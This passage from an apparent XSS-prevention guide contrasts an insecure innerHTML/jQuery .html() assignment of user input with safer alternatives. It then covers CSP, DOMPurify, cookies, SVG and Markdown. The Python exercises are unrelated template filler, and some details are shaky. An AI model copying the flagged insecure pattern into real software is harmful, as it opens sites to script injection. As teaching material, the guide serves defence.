document.getElementById("output").innerHTML = userInput;

// NG: jQuery's .html() is the same as innerHTML
$('#output').html(userInput);

// OK: Use textContent
document.getElementById("output").textContent = userInput;

// OK: Use jQuery's .text()
$('#output').text(userInput);

// OK: If HTML must be inserted, go through DOMPurify
document.getElementById("output").innerHTML =
    DOMPurify.sanitize(userInput);
```


---

## Practical Exercises

### Exercise 1: Basic Implementation

Implement code that meets the following requirements.

**Requirements:**
- Validate input data
- Implement proper error handling
- Also create test code

```python
# Exercise 1: Basic implementation template
class Exercise1:
    """Exercise on basic implementation patterns"""

    def __init__(self):
        self.data = []

    def validate_input(self, value):
        """Input value validation"""
        if value is None:
            raise ValueError("Input value is None")
        return True

    def process(self, value):
        """Main data processing logic"""
        self.validate_input(value)
        self.data.append(value)
        return self.data

    def get_results(self):
        """Retrieve processing results"""
        return {
            'count': len(self.data),
            'data': self.data
        }

# Tests
def test_exercise1():
    ex = Exercise1()
    assert ex.process(1) == [1]
    assert ex.process(2) == [1, 2]
    assert ex.get_results()['count'] == 2

    try:
        ex.process(None)
        assert False, "Exception should have been raised"
    except ValueError:
        pass

    print("All tests passed!")

test_exercise1()
```

### Exercise 2: Applied Pattern

Extend the basic implementation to add the following features.

```python
# Exercise 2: Applied pattern
from typing import List, Dict, Optional
from datetime import datetime

class AdvancedExercise:
    """Exercise on applied patterns"""

    def __init__(self, max_size: int = 100):
        self._items: List[Dict] = []
        self._max_size = max_size
        self._created_at = datetime.now()

    def add(self, key: str, value: any) -> bool:
        """Add an item (with size limit)"""
        if len(self._items) >= self._max_size:
            return False
        self._items.append({
            'key': key,
            'value': value,
            'timestamp': datetime.now().isoformat()
        })
        return True

    def find(self, key: str) -> Optional[Dict]:
        """Search by key"""
        for item in reversed(self._items):
            if item['key'] == key:
                return item
        return None

    def remove(self, key: str) -> bool:
        """Delete by key"""
        for i, item in enumerate(self._items):
            if item['key'] == key:
                self._items.pop(i)
                return True
        return False

    def stats(self) -> Dict:
        """Statistics"""
        return {
            'total_items': len(self._items),
            'max_size': self._max_size,
            'usage_percent': len(self._items) / self._max_size * 100,
            'uptime': str(datetime.now() - self._created_at)
        }

# Tests
def test_advanced():
    ex = AdvancedExercise(max_size=3)
    assert ex.add("a", 1) == True
    assert ex.add("b", 2) == True
    assert ex.add("c", 3) == True
    assert ex.add("d", 4) == False  # Size limit
    assert ex.find("b")['value'] == 2
    assert ex.remove("b") == True
    assert ex.find("b") is None
    stats = ex.stats()
    assert stats['total_items'] == 2
    print("All applied tests passed!")

test_advanced()
```

### Exercise 3: Performance Optimization

Improve the performance of the following code.

```python
# Exercise 3: Performance optimization
import time
from functools import lru_cache

# Before optimization (O(n^2))
def slow_search(data: list, target: int) -> int:
    """Inefficient search"""
    for i in range(len(data)):
        for j in range(i + 1, len(data)):
            if data[i] + data[j] == target:
                return (i, j)
    return (-1, -1)

# After optimization (O(n))
def fast_search(data: list, target: int) -> tuple:
    """Efficient search using a hash map"""
    seen = {}
    for i, num in enumerate(data):
        complement = target - num
        if complement in seen:
            return (seen[complement], i)
        seen[num] = i
    return (-1, -1)

# Benchmark
def benchmark():
    import random
    data = list(range(5000))
    random.shuffle(data)
    target = data[100] + data[4000]

    start = time.time()
    result1 = slow_search(data, target)
    slow_time = time.time() - start

    start = time.time()
    result2 = fast_search(data, target)
    fast_time = time.time() - start

    print(f"Inefficient version: {slow_time:.4f}s")
    print(f"Efficient version:   {fast_time:.6f}s")
    print(f"Speedup: {slow_time/fast_time:.0f}x")

benchmark()
```

**Key Points:**
- Be mindful of algorithm complexity
- Choose appropriate data structures
- Measure effectiveness with benchmarks
---

## FAQ

### Q1: Can XSS still occur in frameworks with auto-escaping?

Yes. XSS can occur when using features that bypass auto-escaping, such as `dangerouslySetInnerHTML` (React), `v-html` (Vue), and `|safe` (Django/Jinja2). Use these sparingly, and when you must, sanitize with DOMPurify or similar.

### Q2: Can CSP alone completely prevent XSS?

CSP alone is insufficient. CSP is a powerful tool for mitigating the impact of XSS, but it can be bypassed in the following cases:
- When `'unsafe-inline'` is set
- CSP bypass gadgets (e.g., when an allowed domain has a JSONP endpoint)
- Some DOM-based XSS (when the data flow is entirely client-side)
Layered defense combining input validation, output escaping, and CSP is required.

### Q3: Are HttpOnly Cookies a complete defense against XSS?

HttpOnly prevents JavaScript access to Cookies, but does not prevent XSS itself. If XSS succeeds, the following attacks are still possible:
- Sending API requests (Cookies are included automatically)
- Defacing page content
- Intercepting keystrokes
- Displaying phishing forms
Attack methods other than Cookie theft remain viable.

### Q4: Is it safe to allow SVG file uploads?

SVG is XML-based and can contain `<script>` tags and event handlers, posing an XSS risk. If allowing SVGs:
- Sanitize SVG (DOMPurify's SVG mode)
- Serve from a separate domain (CDN)
- Set Content-Type to `image/svg+xml`
- Display only via `<img>` tags (scripts do not execute)

### Q5: Can XSS occur when rendering Markdown?

XSS can occur during the conversion of Markdown to HTML. In particular, Markdown parsers that allow raw HTML (e.g., marked.js with default settings) are dangerous. Countermeasures:
- Enable the `sanitize: true` option
- Sanitize the converted HTML with DOMPurify
- The combination of marked.js + DOMPurify is recommended

### Q6: What is the difference between Content-Security-Policy and Content-Security-Policy-Report-Only?

`Content-Security-Policy` blocks resources that violate the policy. `Content-Security-Policy-Report-Only` does not block but only reports violations. When introducing CSP, the recommended pattern is to first confirm the impact with Report-Only, then switch to enforced mode after verifying no issues.

---

## Troubleshooting

### Site stopped working after setting CSP

```
Checklist:
1. Check CSP violation errors in browser DevTools Console
2. Switch back to Report-Only mode and collect violation reports
3. If there are inline scripts:
   → Set nonce or hash
4. If there are scripts/styles from external CDNs:
   → Add to script-src / style-src
5. Google Analytics, Tag Manager, etc.:
   → Handle with 'strict-dynamic' + nonce
6. If a library uses eval():
   → Add 'unsafe-eval' (understanding the risk)
   → If possible, migrate to a library that does not use eval()
```

### DOMPurify is breaking HTML

```
Checklist:
1. Check that required tags are included in ALLOWED_TAGS
2. Check that required attributes are included in ALLOWED_ATTR
3. Check that generic attributes like class, id are allowed
4. When using SVG / MathML:
   → Explicitly enable with USE_PROFILES
5. Custom data-* attributes:
   → Set ALLOW_DATA_ATTR: true
```

---

## Summary

| Countermeasure | Effect | When to Apply | Importance |
|----------------|--------|---------------|------------|
| Auto-escaping | Prevents HTML injection at output | Template rendering | Required |
| Sanitization | Only allows permitted HTML through | When saving user-generated content | Recommended |
| CSP | Prevents inline script execution | HTTP response header | Strongly recommended |
| Nonce-based CSP | Prevents CSP bypass | Dynamic pages | Recommended |
| HttpOnly Cookie | Prevents Cookie theft | Cookie settings | Required |
| Context-specific escaping | Safe display at each output destination | All output processing | Required |
| Trusted Types | Prevents XSS in DOM manipulation | Client-side JS | Recommended |
| X-Content-Type-Options | Prevents MIME sniffing | HTTP header | Required |

---

## Guides to Read Next

- [02-csrf-clickjacking.md](./02-csrf-clickjacking.md) -- CSRF/Clickjacking countermeasures
- [03-injection.md](./03-injection.md) -- Injection attacks in general
- [../04-application-security/00-secure-coding.md](../04-application-security/00-secure-coding.md) -- Secure coding in general
- [../02-cryptography/01-tls-certificates.md](../02-cryptography/01-tls-certificates.md) -- Encrypted communication

---

## References

1. OWASP XSS Prevention Cheat Sheet -- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
2. MDN Web Docs: Content Security Policy -- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
3. DOMPurify -- https://github.com/cure53/DOMPurify
4. Google CSP Evaluator -- https://csp-evaluator.withgoogle.com/
5. PortSwigger: Cross-Site Scripting -- https://portswigger.net/web-security/cross-site-scripting
6. CWE-79: Improper Neutralization of Input During Web Page Generation -- https://cwe.mitre.org/data/definitions/79.html
7. Trusted Types API -- https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API
8. HTML Living Standard: Parsing -- https://html.spec.whatwg.org/multipage/parsing.html
